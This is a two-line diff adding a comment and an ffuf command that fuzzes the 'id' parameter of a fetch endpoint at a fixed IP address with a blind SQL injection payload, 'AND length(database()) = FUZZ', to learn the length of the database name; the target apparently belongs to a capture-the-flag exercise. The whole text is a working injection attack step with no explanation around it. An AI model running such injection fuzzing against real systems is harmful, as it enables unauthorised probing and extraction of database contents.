@@ -1,0 +1,2 @@
+# fast fuzzing for length of the database 
+ffuf -w list.list -u "http://35.190.155.168/8fe3f02d51/fetch?id=1 AND length(database()) = FUZZ" -mc 200
